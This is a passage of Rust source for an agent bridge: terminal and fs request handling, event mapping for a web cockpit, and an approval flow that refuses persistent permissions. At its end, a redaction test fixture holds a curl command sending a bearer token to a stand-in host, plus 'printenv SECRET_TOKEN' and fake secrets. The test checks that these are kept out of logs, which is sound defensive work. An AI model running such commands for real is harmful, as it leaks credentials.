                                        ts,
                                    };
                                    emit_event(&fs_handle, review_event).await;
                                }
                            }
                            Err(e) => {
                                let _ = fs_acp.client.respond_error(
                                    req.id,
                                    e.jsonrpc_code(),
                                    e.to_string(),
                                    e.jsonrpc_data(),
                                );
                            }
                        },
                        _ => {
                            let _ = fs_acp.client.respond_error(
                                req.id,
                                -32601,
                                format!("unknown fs method: {}", req.method),
                                serde_json::json!({}),
                            );
                        }
                    }
                }
                info!(session = %fs_handle.id, "ACP fs channel closed");
            });
        }

        // Stage X.5c.3 — terminal handler task.
        if let Some(mut terminal_rx) = terminal_rx {
            let term_ctx = crate::agent_runtime::acp::terminal_handler::build_terminal_context(
                &profile,
                &opts.project_root,
                &opts.session_id,
                &opts.agent.id,
                opts.audit.clone(),
            );
            let term_acp = Arc::clone(&acp_runtime);
            let term_handle = Arc::clone(&handle);
            tokio::spawn(async move {
                use crate::agent_runtime::acp::terminal_handler::*;
                while let Some(req) = terminal_rx.recv().await {
                    let method = req.method.clone();
                    let params = req.params.clone();
                    let result = match method.as_str() {
                        "terminal/create" => handle_terminal_create(&term_ctx, &req.params)
                            .await
                            .map_err(|e| (e.jsonrpc_code(), e.to_string(), e.jsonrpc_data())),
                        "terminal/output" => handle_terminal_output(&term_ctx, &req.params)
                            .await
                            .map_err(|e| (e.jsonrpc_code(), e.to_string(), e.jsonrpc_data())),
                        "terminal/wait_for_exit" => {
                            handle_terminal_wait_for_exit(&term_ctx, &req.params)
                                .await
                                .map_err(|e| (e.jsonrpc_code(), e.to_string(), e.jsonrpc_data()))
                        }
                        "terminal/kill" => handle_terminal_kill(&term_ctx, &req.params)
                            .await
                            .map_err(|e| (e.jsonrpc_code(), e.to_string(), e.jsonrpc_data())),
                        "terminal/release" => handle_terminal_release(&term_ctx, &req.params)
                            .await
                            .map_err(|e| (e.jsonrpc_code(), e.to_string(), e.jsonrpc_data())),
                        _ => Err((
                            -32601,
                            format!("unknown terminal method: {}", req.method),
                            serde_json::json!({}),
                        )),
                    };
                    match result {
                        Ok(value) => {
                            // Audit P2 fix: emit `terminal.lifecycle`
                            // ServerEvents so the cockpit Activity log
                            // surfaces terminal create/exit/kill/release
                            // in real time instead of waiting for the
                            // agent to poll `terminal/output`. Each
                            // event carries enough context (terminalId,
                            // command, args, exitCode when relevant)
                            // to render a one-line activity row.
                            if let Some(lp) =
                                build_terminal_lifecycle_payload(&method, &params, &value)
                            {
                                let payload = serde_json::json!({
                                    "kind": lp.kind,
                                    "terminal_id": lp.terminal_id,
                                    "command": lp.command,
                                    "args": lp.args,
                                    "exit_code": lp.exit_code,
                                    "agent_id": term_ctx.agent_id.clone(),
                                    "agent_kind": "acp",
                                });
                                let lifecycle = ServerEvent {
                                    seq: 0,
                                    session_id: term_handle.id.clone(),
                                    event_type: "terminal.lifecycle".into(),
                                    payload,
                                    v: 1,
                                    ts: chrono::Utc::now().to_rfc3339(),
                                };
                                emit_event(&term_handle, lifecycle).await;
                            }
                            let _ = term_acp.client.respond_result(req.id, value);
                        }
                        Err((code, msg, data)) => {
                            let _ = term_acp.client.respond_error(req.id, code, msg, data);
                        }
                    }
                }
                info!(session = %term_handle.id, "ACP terminal channel closed");
            });
        }

        // Watchdog — same shape as JSON-RPC path.
        let handle_wait = Arc::clone(&handle);
        tokio::spawn(async move {
            let status = child.wait().await;
            info!(session = %handle_wait.id, status = ?status, "ACP child exited");
            let crashed = status.as_ref().map(|s| !s.success()).unwrap_or(true);
            if crashed {
                let ts = chrono::Utc::now().to_rfc3339();
                let event = ServerEvent {
                    seq: 0,
                    session_id: handle_wait.id.clone(),
                    event_type: "transcript.error".into(),
                    payload: serde_json::json!({
                        "reason": "child_exited",
                        "agent_id": handle_wait.agent_id,
                        "agent_kind": handle_wait.agent_kind.as_str(),
                        "status": format!("{status:?}"),
                    }),
                    v: 1,
                    ts,
                };
                emit_event(&handle_wait, event).await;
            }
            let _ = handle_wait
                .state
                .transition(bridge_core::SessionState::Closing);
            let _ = handle_wait
                .state
                .transition(bridge_core::SessionState::Closed);
        });

        // Spawn VIL-style workflow process for this session.
        if let Some(spec) = workflow_spec_acp {
            use crate::workflows::process::start_workflow_process;
            start_workflow_process(
                handle.id.clone(),
                Arc::clone(&ring),
                bcast_tx.clone(),
                bcast_tx.subscribe(),
                spec,
            );
        }

        Ok(handle)
    }
}

/// X.5h.2 — detect an OpenCode ACP agent for the bridge wiring step.
/// Matches the agents.toml id (`opencode`/`opencode-*`) or a bare
/// `opencode` binary basename so a custom alias still gets the tap wired.
fn is_opencode_agent(agent_id: &str, command: &std::path::Path) -> bool {
    if agent_id == "opencode" || agent_id.starts_with("opencode-") {
        return true;
    }
    command
        .file_name()
        .and_then(|s| s.to_str())
        .map(|s| s == "opencode")
        .unwrap_or(false)
}

/// X.5h.2 — pick a free local TCP port by binding `:0`. Small TOCTOU
/// window between drop and the opencode child's rebind is acceptable
/// for a local-bridge child and avoids a new `portpicker` dep.
fn pick_free_port() -> std::io::Result<u16> {
    let listener = std::net::TcpListener::bind("127.0.0.1:0")?;
    let port = listener.local_addr()?.port();
    drop(listener);
    Ok(port)
}

/// Map an ACP `session/update` notification onto the VAC event surface.
///
/// X.5f.1 keeps the legacy events alive while adding a richer, Zed-like
/// normalized event lane for the web cockpit:
///
/// - `agent_message_chunk` → `transcript.delta`
/// - `agent_thought_chunk` → `transcript.thought_delta` (+ legacy thought delta)
/// - `tool_call` → `tool.call.created` (+ legacy tool.* lane)
/// - `tool_call_update` → `tool.call.updated` (+ diff/terminal side-channel events)
/// - `plan` / `plan_update` → `plan.updated`
/// - provider controls → `session.*.updated` events
///
/// Unknown/vendor-specific updates remain lossless in debug logs and on
/// the original `SessionNotification::update` payload.
async fn map_acp_update(handle: &SessionHandleRef, notif: SessionNotification) {
    let disc = notif.discriminator().unwrap_or("unknown").to_string();
    info!(session = %handle.id, disc = %disc, "ACP session/update received");
    let ts = chrono::Utc::now().to_rfc3339();
    match notif.parsed_update() {
        AcpSessionUpdate::AgentMessageChunk { text } => {
            let event = ServerEvent {
                seq: 0,
                session_id: handle.id.clone(),
                event_type: "transcript.delta".into(),
                payload: serde_json::json!({ "delta": text }),
                v: 1,
                ts,
            };
            emit_event(handle, event).await;
        }
        AcpSessionUpdate::AgentThoughtChunk { text } => {
            // X.5h.1 — if a sub-agent task is active, attach its
            // tool_call_id so the FE can render the thought collapsed
            // inside that task card. None for top-level thoughts.
            let parent_tool_call_id = handle
                .acp
                .as_ref()
                .and_then(|acp| acp.current_task_parent(""));
            let mut payload = serde_json::json!({ "delta": text });
            if let Some(p) = parent_tool_call_id.as_deref() {
                payload["parent_tool_call_id"] = serde_json::Value::String(p.to_string());
            }
            let thought_event = ServerEvent {
                seq: 0,
                session_id: handle.id.clone(),
                event_type: "transcript.thought_delta".into(),
                payload,
                v: 1,
                ts: ts.clone(),
            };
            emit_event(handle, thought_event).await;

            // Backward compatibility for the pre-rich transcript surface.
            let mut legacy_payload = serde_json::json!({ "delta": text, "kind": "thought" });
            if let Some(p) = parent_tool_call_id.as_deref() {
                legacy_payload["parent_tool_call_id"] = serde_json::Value::String(p.to_string());
            }
            let legacy_event = ServerEvent {
                seq: 0,
                session_id: handle.id.clone(),
                event_type: "transcript.delta".into(),
                payload: legacy_payload,
                v: 1,
                ts,
            };
            emit_event(handle, legacy_event).await;
        }
        AcpSessionUpdate::ToolCall { tool_call } => {
            let preview = safe_acp_update_preview(&tool_call.raw);
            tracing::debug!(
                session = %handle.id,
                update_preview = ?preview,
                "ACP tool_call normalized"
            );
            map_tool_activity(handle, &notif).await;
        }
        AcpSessionUpdate::ToolCallUpdate { update } => {
            let preview = safe_acp_update_preview(&update.raw);
            tracing::debug!(
                session = %handle.id,
                update_preview = ?preview,
                "ACP tool_call_update normalized"
            );
            map_tool_activity(handle, &notif).await;
        }
        AcpSessionUpdate::Plan { entries } => {
            let entries: Vec<_> = entries.into_iter().map(|entry| entry.raw).collect();
            let event = ServerEvent {
                seq: 0,
                session_id: handle.id.clone(),
                event_type: "plan.updated".into(),
                payload: serde_json::json!({ "entries": entries }),
                v: 1,
                ts,
            };
            emit_event(handle, event).await;
        }
        AcpSessionUpdate::AvailableCommandsUpdate { commands } => {
            let event = ServerEvent {
                seq: 0,
                session_id: handle.id.clone(),
                event_type: "session.available_commands.updated".into(),
                payload: serde_json::json!({ "commands": commands }),
                v: 1,
                ts,
            };
            emit_event(handle, event).await;
        }
        AcpSessionUpdate::CurrentModeUpdate { mode_id } => {
            let event = ServerEvent {
                seq: 0,
                session_id: handle.id.clone(),
                event_type: "session.mode.updated".into(),
                payload: serde_json::json!({ "mode_id": mode_id }),
                v: 1,
                ts,
            };
            emit_event(handle, event).await;
        }
        AcpSessionUpdate::ConfigOptionsUpdate { options } => {
            let event = ServerEvent {
                seq: 0,
                session_id: handle.id.clone(),
                event_type: "session.config_options.updated".into(),
                payload: serde_json::json!({ "options": options }),
                v: 1,
                ts,
            };
            emit_event(handle, event).await;
        }
        AcpSessionUpdate::Unknown { discriminator, raw } => {
            let raw_keys = raw
                .as_object()
                .map(|o| o.keys().cloned().collect::<Vec<_>>())
                .unwrap_or_default();
            tracing::debug!(
                session = %handle.id,
                variant = %discriminator,
                raw_keys = ?raw_keys,
                "ACP session/update variant ignored at X.5f.1 scope"
            );
        }
    }
}

/// Redaction-safe preview for ACP `session/update` tracing. This helper
/// intentionally keeps only structural metadata needed to diagnose event
/// routing and excludes rawInput/rawOutput/content text/vendor payloads.
///
/// X.5f.3 Patch A: also surfaces snake_case `tool_call_id` and bare
/// `id` so we can diagnose Gemini-shape payloads at trace time. The
/// payload-level recovery still happens in `extract_observed_tool_activity`;
/// this preview just avoids the misleading `toolCallId: null` log line
/// when the raw frame actually carried a snake_case id.
fn safe_acp_update_preview(update: &serde_json::Value) -> serde_json::Value {
    let tool_call_id_camel = update.get("toolCallId").and_then(|v| v.as_str());
    let tool_call_id_snake = update.get("tool_call_id").and_then(|v| v.as_str());
    let bare_id = update.get("id").and_then(|v| v.as_str());
    let resolved_tool_call_id = tool_call_id_camel
        .filter(|s| !s.is_empty())
        .or(tool_call_id_snake.filter(|s| !s.is_empty()))
        .or(bare_id.filter(|s| !s.is_empty()));
    let raw_shape_hint = if tool_call_id_camel.filter(|s| !s.is_empty()).is_some() {
        "canonical"
    } else if tool_call_id_snake.filter(|s| !s.is_empty()).is_some()
        || bare_id.filter(|s| !s.is_empty()).is_some()
    {
        "gemini"
    } else {
        "unknown"
    };
    serde_json::json!({
        "sessionUpdate": update.get("sessionUpdate").and_then(|v| v.as_str()),
        "toolCallId": resolved_tool_call_id,
        "raw_shape": raw_shape_hint,
        "kind": update.get("kind").and_then(|v| v.as_str()),
        "status": update.get("status").and_then(|v| v.as_str()),
        "title_present": update.get("title").is_some(),
        "locations_count": update.get("locations").and_then(|v| v.as_array()).map(|a| a.len()).unwrap_or(0),
        "content_count": update.get("content").and_then(|v| v.as_array()).map(|a| a.len()).unwrap_or(0),
    })
}

/// X.5c.2 — normalize a `tool_call` / `tool_call_update`
/// notification into an `ObservedToolActivity` and emit the
/// per-kind VAC events.
///
/// Observe-only: this function never blocks the agent, never
/// mutates the wire, and never enables fs/terminal capabilities.
/// It surfaces what the agent already did.
async fn map_tool_activity(handle: &SessionHandleRef, notif: &SessionNotification) {
    let raw_params = serde_json::json!({
        "sessionId": notif.session_id,
        "update": notif.update,
    });
    let Some(mut activity) = extract_observed_tool_activity(
        &handle.id,
        &handle.agent_id,
        handle.agent_kind,
        &raw_params,
        DEFAULT_RAW_OUTPUT_CAP_BYTES,
    ) else {
        return;
    };

    // Attach approved_by_approval_id when correlation hits.
    if let Some(acp) = handle.acp.as_ref() {
        if let Some(approval_id) = acp.correlate_approval(
            &activity.tool_call_id,
            activity.approval_tool_call_hash.as_deref(),
        ) {
            activity.approved_by_approval_id = Some(approval_id);
        }
    }

    // X.5h.1 — Trae-style sub-agent nesting.
    //
    // Maintain the task scope stack BEFORE snapshotting parent so a
    // sub-agent task tool itself doesn't claim itself as parent (the
    // helper already filters self, but pushing here keeps the stack
    // tip accurate for any *child* events that arrive between this
    // pending frame and the matching completion).
    //
    // Push on pending/in_progress for ToolKind::Task; pop on terminal
    // status. Idempotent push tolerates repeated in_progress frames
    // from the agent (ACP allows incremental updates per tool call).
    // A sub-agent dispatch surfaces as ToolKind::Other with a non-empty
    // `subagent_type` (mirrors raw_input.subagent_type from the OpenCode
    // `task` tool shape). We can't rely on a dedicated ToolKind::Task
    // because providers vary — `subagent_type` is the cross-provider signal.
    let is_subagent_task = activity.subagent_type.is_some();
    let parent_tool_call_id: Option<String> = if let Some(acp) = handle.acp.as_ref() {
        if is_subagent_task {
            match activity.status {
                ToolStatus::Pending | ToolStatus::InProgress => {
                    // X.5h.3 — honor the depth cap. When the stack is
                    // already at MAX_SUBAGENT_DEPTH, the new task is
                    // refused and falls through to surface under the
                    // depth-cap-ancestor (snapshotted by
                    // `current_task_parent` below). We emit a
                    // structured warning so adapters that fork-bomb
                    // the timeline are visible in operator logs.
                    match acp.enter_task_scope(&activity.tool_call_id) {
                        EnterTaskScopeResult::Pushed { .. }
                        | EnterTaskScopeResult::AlreadyPresent => {}
                        EnterTaskScopeResult::RefusedDepthExceeded {
                            current_depth,
                            max_depth,
                        } => {
                            warn!(
                                session = %handle.id,
                                tool_call_id = %activity.tool_call_id,
                                subagent_type = ?activity.subagent_type,
                                current_depth,
                                max_depth,
                                "sub-agent task scope refused: depth cap reached; child will surface under depth-cap-ancestor"
                            );
                        }
                    }
                }
                ToolStatus::Completed | ToolStatus::Failed => {
                    acp.exit_task_scope(&activity.tool_call_id);
                }
            }
        }
        acp.current_task_parent(&activity.tool_call_id)
    } else {
        None
    };

    let event_type = match activity.status {
        ToolStatus::Failed => "tool.failed",
        ToolStatus::Pending => "tool.observed",
        _ => "tool.updated",
    };
    let mut payload = serde_json::to_value(&activity).unwrap_or(serde_json::Value::Null);
    if let (Some(p), Some(obj)) = (parent_tool_call_id.as_deref(), payload.as_object_mut()) {
        obj.insert(
            "parent_tool_call_id".to_string(),
            serde_json::Value::String(p.to_string()),
        );
    }
    let ts = chrono::Utc::now().to_rfc3339();
    let event = ServerEvent {
        seq: 0,
        session_id: handle.id.clone(),
        event_type: event_type.into(),
        payload: payload.clone(),
        v: 1,
        ts: ts.clone(),
    };
    emit_event(handle, event).await;

    let rich_event_type = match notif.discriminator() {
        Some("tool_call") => "tool.call.created",
        Some("tool_call_update") => "tool.call.updated",
        _ => "tool.call.updated",
    };
    let rich_event = ServerEvent {
        seq: 0,
        session_id: handle.id.clone(),
        event_type: rich_event_type.into(),
        payload: payload.clone(),
        v: 1,
        ts: ts.clone(),
    };
    emit_event(handle, rich_event).await;

    if !activity.diffs.is_empty() {
        let diff_event = ServerEvent {
            seq: 0,
            session_id: handle.id.clone(),
            event_type: "tool.diff.updated".into(),
            payload: serde_json::json!({
                "tool_call_id": activity.tool_call_id,
                "status": payload.get("status").cloned().unwrap_or(serde_json::Value::Null),
                "diffs": activity.diffs.clone(),
                "locations": activity.locations.clone(),
                "approved_by_approval_id": activity.approved_by_approval_id.clone(),
                "agent_id": activity.agent_id,
                "agent_kind": activity.agent_kind.as_str(),
            }),
            v: 1,
            ts: ts.clone(),
        };
        emit_event(handle, diff_event).await;
    }

    if matches!(activity.kind, ToolKind::Execute) && !matches!(activity.status, ToolStatus::Pending)
    {
        let terminal_event = ServerEvent {
            seq: 0,
            session_id: handle.id.clone(),
            event_type: "tool.terminal.updated".into(),
            payload: serde_json::json!({
                "tool_call_id": activity.tool_call_id,
                "status": payload.get("status").cloned().unwrap_or(serde_json::Value::Null),
                "raw_input_redacted": activity.raw_input_redacted.clone(),
                "raw_output_redacted": activity.raw_output_redacted.clone(),
                "approved_by_approval_id": activity.approved_by_approval_id.clone(),
                "agent_id": activity.agent_id,
                "agent_kind": activity.agent_kind.as_str(),
            }),
            v: 1,
            ts: ts.clone(),
        };
        emit_event(handle, terminal_event).await;
    }

    // X.5c.2 audit row. Severity: Info for observed/updated; Warn for
    // failed (NEVER Error — task-level failure is not bridge crash).
    if let Some(acp) = handle.acp.as_ref() {
        if let Some(audit) = acp.audit.as_ref() {
            let severity = match activity.status {
                ToolStatus::Failed => bridge_core::AuditSeverity::Warn,
                _ => bridge_core::AuditSeverity::Info,
            };
            let audit_fields = serde_json::json!({
                "event": event_type,
                "toolCallId": activity.tool_call_id,
                "kind": payload.get("kind").cloned().unwrap_or(serde_json::Value::Null),
                "status": payload.get("status").cloned().unwrap_or(serde_json::Value::Null),
                "locations": activity.locations,
                "approval_tool_call_hash": activity.approval_tool_call_hash,
                "raw_input_hash": activity.raw_input_hash,
                "approved_by_approval_id": activity.approved_by_approval_id,
                "agent_id": activity.agent_id,
                "agent_kind": activity.agent_kind.as_str(),
            });
            audit.log(&handle.id, "tool", severity, audit_fields);
        }
    }

    // Edit-kind activity also drives Review.
    // Render only when we have either real locations or actual diff
    // entries — pure-pending tool_call (no content yet) carries
    // neither and shouldn't pollute the Review surface.
    if matches!(activity.kind, ToolKind::Edit)
        && (!activity.locations.is_empty() || !activity.diffs.is_empty())
    {
        let review_payload = serde_json::json!({
            "tool_call_id": activity.tool_call_id,
            "status": payload.get("status").cloned().unwrap_or(serde_json::Value::Null),
            "locations": activity.locations,
            "diffs": activity.diffs,
            "raw_input_redacted": activity.raw_input_redacted,
            "approved_by_approval_id": activity.approved_by_approval_id,
            "agent_id": activity.agent_id,
            "agent_kind": activity.agent_kind.as_str(),
        });
        let review_event = ServerEvent {
            seq: 0,
            session_id: handle.id.clone(),
            event_type: "review.changeset_updated".into(),
            payload: review_payload,
            v: 1,
            ts: ts.clone(),
        };
        emit_event(handle, review_event).await;
    }

    // Execute-kind activity drives Runtime as a job log line.
    // Skip the initial pending tool_call (no rawInput / rawOutput
    // yet) so the runtime stream only carries useful payloads.
    if matches!(activity.kind, ToolKind::Execute) && !matches!(activity.status, ToolStatus::Pending)
    {
        let cmd = activity
            .raw_input_redacted
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let runtime_payload = serde_json::json!({
            "tool_call_id": activity.tool_call_id,
            "status": payload.get("status").cloned().unwrap_or(serde_json::Value::Null),
            "command": cmd,
            "output": activity.raw_output_redacted.clone(),
            "approved_by_approval_id": activity.approved_by_approval_id.clone(),
            "agent_id": activity.agent_id,
            "agent_kind": activity.agent_kind.as_str(),
        });
        let runtime_event = ServerEvent {
            seq: 0,
            session_id: handle.id.clone(),
            event_type: "runtime.job_log".into(),
            payload: runtime_payload,
            v: 1,
            ts,
        };
        emit_event(handle, runtime_event).await;
    }
}

// X.5c will use this to surface json-rpc protocol errors as typed acks.
#[allow(dead_code)]
fn classify_for_ack(e: &crate::agent_runtime::acp::JsonRpcError) -> &'static str {
    classify_jsonrpc_error(e)
}

/// X.5c.1 — receive a `session/request_permission`, register a pending
/// approval, schedule an auto-cancel timer, and emit `approval.pending`
/// to the broadcast.
async fn handle_permission_request(handle: &SessionHandleRef, req: PermissionRequest) {
    let Some(acp) = handle.acp.clone() else {
        warn!("permission request on non-ACP session — dropping");
        return;
    };
    let approval_id = format!("appr_{}", ulid::Ulid::new());
    let options = req
        .params
        .get("options")
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default();
    let tool_call = req
        .params
        .get("toolCall")
        .cloned()
        .unwrap_or(serde_json::Value::Null);

    // Auto-cancel timer.
    let acp_for_timer = Arc::clone(&acp);
    let approval_id_for_timer = approval_id.clone();
    let acp_request_id = req.id;
    let timeout_ms = acp.permission_timeout_ms;
    let handle_for_timer = Arc::clone(handle);
    let timer = tokio::spawn(async move {
        tokio::time::sleep(std::time::Duration::from_millis(timeout_ms)).await;
        // Only fire if still pending.
        if acp_for_timer
            .pending_approvals
            .remove(&approval_id_for_timer)
            .is_some()
        {
            warn!(
                approval_id = %approval_id_for_timer,
                "permission auto-cancelled after timeout"
            );
            let outcome = serde_json::json!({ "outcome": { "outcome": "cancelled" } });
            let _ = acp_for_timer
                .client
                .respond_permission(acp_request_id, outcome);
            let event = ServerEvent {
                seq: 0,
                session_id: handle_for_timer.id.clone(),
                event_type: "approval.resolved".into(),
                payload: serde_json::json!({
                    "approval_id": approval_id_for_timer,
                    "outcome": "timeout",
                }),
                v: 1,
                ts: chrono::Utc::now().to_rfc3339(),
            };
            emit_event(&handle_for_timer, event).await;
        }
    });
    let timer_handle = Arc::new(timer.abort_handle());

    acp.pending_approvals.insert(
        approval_id.clone(),
        PendingApproval {
            acp_request_id,
            options: options.clone(),
            tool_call: tool_call.clone(),
            created_at: chrono::Utc::now(),
            timeout_handle: timer_handle,
        },
    );

    let event = ServerEvent {
        seq: 0,
        session_id: handle.id.clone(),
        event_type: "approval.pending".into(),
        payload: serde_json::json!({
            "approval_id": approval_id,
            "tool_call": tool_call,
            "options": options,
            "expires_in_ms": timeout_ms,
        }),
        v: 1,
        ts: chrono::Utc::now().to_rfc3339(),
    };
    emit_event(handle, event).await;
}

/// Approve / reject intent — drives kind validation when an explicit
/// `option_id` is supplied by the caller.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApprovalIntent {
    Approve,
    Reject,
}

/// Typed resolution failure so the translator can map to stable ack
/// codes without string sniffing.
#[derive(Debug, thiserror::Error)]
pub enum ApprovalResolveError {
    #[error("approval on non-ACP session")]
    NotAcp,
    #[error("approval not found: {0}")]
    NotFound(String),
    #[error("no approve/reject option available in pending options")]
    NoEligibleOption,
    #[error("approval option_id `{0}` not found in pending options")]
    OptionNotFound(String),
    #[error(
        "approval option_id `{option_id}` (kind `{kind}`) does not match the {intent:?} intent"
    )]
    OptionKindMismatch {
        option_id: String,
        kind: String,
        intent: ApprovalIntent,
    },
    #[error("approval option_id `{0}` is forbidden by bridge policy (allow_always not enabled)")]
    OptionForbidden(String),
    #[error("acp transport: {0}")]
    Transport(String),
}

/// Result of a successful approve / reject resolution. Carries enough
/// data for the translator to write a complete audit row.
#[derive(Debug, Clone)]
pub struct ApprovalResolution {
    pub option_id: String,
    /// The full option object (preserves `kind`, `name`, `_meta`, …).
    pub option: serde_json::Value,
    /// The original `toolCall` payload from the agent's
    /// `session/request_permission` request.
    pub tool_call: serde_json::Value,
}

/// Stage X.5c.1 policy gate. Persistent-permission options
/// (`allow_always`) are not yet wired to a per-profile policy, so the
/// bridge default is to refuse them. When the policy plane lands this
/// becomes a profile/agent lookup.
const PERSISTENT_PERMISSION_ALLOWED: bool = false;

impl SessionHandle {
    /// X.5c.1 — resolve a pending ACP approval as APPROVED.
    ///
    /// If the caller supplies `explicit_option_id`, the bridge:
    /// - confirms it exists in `pending.options`,
    /// - confirms its `kind` is an `allow_*` variant,
    /// - rejects `allow_always` unless persistent permission is on.
    ///
    /// Otherwise the policy default picker chooses `allow_once` first.
    pub async fn resolve_approval_approve(
        &self,
        approval_id: &str,
        explicit_option_id: Option<&str>,
    ) -> Result<ApprovalResolution, ApprovalResolveError> {
        self.resolve_approval(approval_id, explicit_option_id, ApprovalIntent::Approve)
            .await
    }

    /// X.5c.1 — resolve a pending ACP approval as REJECTED. Same
    /// validation rules as approve, but `kind` must start with
    /// `reject`.
    pub async fn resolve_approval_reject(
        &self,
        approval_id: &str,
        explicit_option_id: Option<&str>,
    ) -> Result<ApprovalResolution, ApprovalResolveError> {
        self.resolve_approval(approval_id, explicit_option_id, ApprovalIntent::Reject)
            .await
    }

    async fn resolve_approval(
        &self,
        approval_id: &str,
        explicit_option_id: Option<&str>,
        intent: ApprovalIntent,
    ) -> Result<ApprovalResolution, ApprovalResolveError> {
        let acp = self.acp.as_ref().ok_or(ApprovalResolveError::NotAcp)?;

        // X.5c.1 hardening: validate the option *before* removing the
        // pending entry or aborting its timeout. A bad override must
        // not strip timeout protection from a still-held permission
        // request — otherwise an invalid attempt followed by user
        // silence leaves the agent waiting forever.
        // Clone only what `resolve_option` needs; the DashMap read
        // guard is released at the end of this scope, well before any
        // await.
        let options_snapshot = {
            let entry = acp
                .pending_approvals
                .get(approval_id)
                .ok_or_else(|| ApprovalResolveError::NotFound(approval_id.to_string()))?;
            entry.options.clone()
        };
        let chosen = resolve_option(&options_snapshot, explicit_option_id, intent)?;

        // Validation passed — now remove + abort. If the entry
        // disappeared between the get() and the remove() (e.g. the
        // timer fired or another concurrent resolve won the race),
        // surface NotFound so the caller doesn't double-resolve.
        let (_, pending) = acp
            .pending_approvals
            .remove(approval_id)
            .ok_or_else(|| ApprovalResolveError::NotFound(approval_id.to_string()))?;
        pending.timeout_handle.abort();

        let outcome = serde_json::json!({
            "outcome": { "outcome": "selected", "optionId": chosen.option_id }
        });
        acp.client
            .respond_permission(pending.acp_request_id, outcome)
            .map_err(|e| ApprovalResolveError::Transport(e.to_string()))?;

        let outcome_label = match intent {
            ApprovalIntent::Approve => "approved",
            ApprovalIntent::Reject => "rejected",
        };
        // X.5c.2 — only populate the correlation cache for approvals
        // that actually let the tool run. Rejected resolutions don't
        // get a "approved by you" badge on subsequent activity.
        if matches!(intent, ApprovalIntent::Approve) {
            acp.record_resolved_approval(approval_id, &pending.tool_call);
        }
        let resolution = ApprovalResolution {
            option_id: chosen.option_id.clone(),
            option: chosen.option,
            tool_call: pending.tool_call.clone(),
        };
        let event = ServerEvent {
            seq: 0,
            session_id: self.id.clone(),
            event_type: "approval.resolved".into(),
            payload: serde_json::json!({
                "approval_id": approval_id,
                "outcome": outcome_label,
                "option_id": resolution.option_id,
            }),
            v: 1,
            ts: chrono::Utc::now().to_rfc3339(),
        };
        emit_to(&self.ring, &self.broadcast, event).await;
        Ok(resolution)
    }
}

struct ChosenOption {
    option_id: String,
    option: serde_json::Value,
}

fn resolve_option(
    options: &[serde_json::Value],
    explicit: Option<&str>,
    intent: ApprovalIntent,
) -> Result<ChosenOption, ApprovalResolveError> {
    let chosen_id = match explicit {
        Some(id) => id.to_string(),
        None => match intent {
            ApprovalIntent::Approve => pick_approve_option_id(options)
                .map_err(|_| ApprovalResolveError::NoEligibleOption)?,
            ApprovalIntent::Reject => pick_reject_option_id(options)
                .map_err(|_| ApprovalResolveError::NoEligibleOption)?,
        },
    };
    let option = options
        .iter()
        .find(|o| o.get("optionId").and_then(|v| v.as_str()) == Some(&chosen_id))
        .ok_or_else(|| ApprovalResolveError::OptionNotFound(chosen_id.clone()))?
        .clone();
    let kind = option
        .get("kind")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let kind_ok = match intent {
        ApprovalIntent::Approve => kind.starts_with("allow"),
        ApprovalIntent::Reject => kind.starts_with("reject"),
    };
    if !kind_ok {
        return Err(ApprovalResolveError::OptionKindMismatch {
            option_id: chosen_id,
            kind,
            intent,
        });
    }
    if kind == "allow_always" && !PERSISTENT_PERMISSION_ALLOWED {
        return Err(ApprovalResolveError::OptionForbidden(chosen_id));
    }
    Ok(ChosenOption {
        option_id: chosen_id,
        option,
    })
}

/// Policy-aware option picker. Prefer `allow_once` over `allow_always`
/// so the bridge doesn't accidentally grant persistent permission when
/// the user just clicks Approve once. If neither is present, fall back
/// to the first non-reject option.
fn pick_approve_option_id(options: &[serde_json::Value]) -> anyhow::Result<String> {
    let id_for = |kind: &str| -> Option<String> {
        options
            .iter()
            .find(|o| o.get("kind").and_then(|k| k.as_str()) == Some(kind))
            .and_then(|o| o.get("optionId").and_then(|v| v.as_str()))
            .map(String::from)
    };
    if let Some(id) = id_for("allow_once") {
        return Ok(id);
    }
    if let Some(id) = id_for("allow_always") {
        return Ok(id);
    }
    // Last resort: first option whose kind doesn't start with "reject".
    options
        .iter()
        .find(|o| {
            o.get("kind")
                .and_then(|k| k.as_str())
                .map(|s| !s.starts_with("reject"))
                .unwrap_or(false)
        })
        .and_then(|o| o.get("optionId").and_then(|v| v.as_str()))
        .map(String::from)
        .ok_or_else(|| anyhow::anyhow!("no approve-eligible option in {options:?}"))
}

fn pick_reject_option_id(options: &[serde_json::Value]) -> anyhow::Result<String> {
    let id_for = |kind: &str| -> Option<String> {
        options
            .iter()
            .find(|o| o.get("kind").and_then(|k| k.as_str()) == Some(kind))
            .and_then(|o| o.get("optionId").and_then(|v| v.as_str()))
            .map(String::from)
    };
    if let Some(id) = id_for("reject_once") {
        return Ok(id);
    }
    if let Some(id) = id_for("reject_always") {
        return Ok(id);
    }
    options
        .iter()
        .find(|o| {
            o.get("kind")
                .and_then(|k| k.as_str())
                .map(|s| s.starts_with("reject"))
                .unwrap_or(false)
        })
        .and_then(|o| o.get("optionId").and_then(|v| v.as_str()))
        .map(String::from)
        .ok_or_else(|| anyhow::anyhow!("no reject-eligible option in {options:?}"))
}

#[cfg(test)]
mod acp_update_preview_tests {
    use super::safe_acp_update_preview;
    use serde_json::json;

    #[test]
    fn safe_preview_excludes_raw_input_and_output_secrets() {
        let update = json!({
            "sessionUpdate": "tool_call_update",
            "toolCallId": "tc_secret",
            "kind": "execute",
            "title": "curl -H Authorization: Bearer sk-ant-SECRETSECRETSECRET https://example.invalid",
            "status": "completed",
            "locations": [{ "path": "/repo/.env", "line": 1 }],
            "content": [{
                "type": "content",
                "content": { "type": "text", "text": "SECRET_TOKEN=abc123" }
            }],
            "rawInput": {
                "command": "printenv SECRET_TOKEN",
                "SECRET_TOKEN": "abc123"
            },
            "rawOutput": "SECRET_TOKEN=abc123",
            "_meta": { "vendorSecret": "abc123" }
        });

        let preview = safe_acp_update_preview(&update);
        let serialized = preview.to_string();

        assert_eq!(preview["sessionUpdate"], json!("tool_call_update"));
        assert_eq!(preview["toolCallId"], json!("tc_secret"));
        assert_eq!(preview["kind"], json!("execute"));
        assert_eq!(preview["status"], json!("completed"));
        assert_eq!(preview["title_present"], json!(true));
        assert_eq!(preview["locations_count"], json!(1));
